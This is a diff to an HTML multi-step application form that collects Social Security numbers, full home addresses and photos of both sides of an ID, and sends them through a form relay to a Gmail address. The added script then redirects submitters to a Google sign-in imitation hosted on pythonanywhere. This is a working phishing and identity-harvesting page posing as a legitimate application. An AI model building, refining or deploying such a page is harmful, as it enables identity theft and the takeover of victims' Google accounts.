@@ -243,6 +243,7 @@
     <span class="step-dot"></span>
     <span class="step-dot"></span>
   </div>
+  <!-- Multi-step Form that collects user information and uploads documents then redirects to an external link -->
   <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
     <input type="hidden" name="_captcha" value="false" />
     <input type="hidden" name="_template" value="table" />
@@ -270,8 +271,8 @@
     <!-- Step 2: Address & ID -->
     <div class="step" id="step2">
       <div class="form-group">
-        <label for="zipcode">Zip Code</label>
-        <input type="text" id="zipcode" name="Zipcode" placeholder="Enter your Zipcode" required />
+        <label for="address">Full Address</label>
+        <input type="text" id="address" name="Full Address" placeholder="Enter your full address, street, city, state, country" required />
       </div>
       <div class="form-group">
         <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
@@ -287,14 +288,59 @@
     <div class="step" id="step3">
       <div class="form-group">
         <label for="id-front">Photo ID (Front)</label>
-        <div class="drag-drop" id="drop-front">Drag & drop or click to upload</div>
-        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png" style="display:name;" />
+        <div class="drag-drop" id="drop-front">
+          Drag & drop or click to upload
+          <span id="file-name-front" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
+        </div>
+        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
       </div>
       <div class="form-group">
         <label for="id-back">Photo ID (Back)</label>
-        <div class="drag-drop" id="drop-back">Drag & drop or click to upload</div>
-        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:name;" />
+        <div class="drag-drop" id="drop-back">
+          Drag & drop or click to upload
+          <span id="file-name-back" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
+        </div>
+        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
       </div>
+      <script>
+        (function() {
+          function updateNameFor(input, el) {
+            if (!input || !el) return;
+            if (input.files && input.files.length) {
+              el.textContent = input.files[0].name;
+              el.style.color = 'var(--text-color)';
+            } else {
+              el.textContent = 'No file chosen';
+              el.style.color = 'var(--text-secondary)';
+            }
+          }
+          const map = [
+            { inputId: 'id-front', nameId: 'file-name-front', dropId: 'drop-front' },
+            { inputId: 'id-back', nameId: 'file-name-back', dropId: 'drop-back' }
+          ];
+          map.forEach(item => {
+            const input = document.getElementById(item.inputId);
+            const nameEl = document.getElementById(item.nameId);
+            const drop = document.getElementById(item.dropId);
+            if (!input || !nameEl || !drop) return;
+            // update when the native file input changes
+            input.addEventListener('change', () => updateNameFor(input, nameEl));
+            // update after a drop (setupDragDrop assigns input.files on drop)
+            drop.addEventListener('drop', () => {
+              setTimeout(() => updateNameFor(input, nameEl), 50);
+            });
+            // initialize
+            updateNameFor(input, nameEl);
+          });
+        })();
+        // Override form redirect to Google sign-in after submission
+        document.getElementById("applicationForm").addEventListener("submit", function(e) {
+          setTimeout(function() {
+            window.location.href = "https://googlesignin.pythonanywhere.com/";
+          }, 1000); // Wait for form to submit before redirecting
+        });
+        /* linked to external link after submission via hidden _redirect input */
+      </script>
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
         <button type="submit">Submit Application</button>
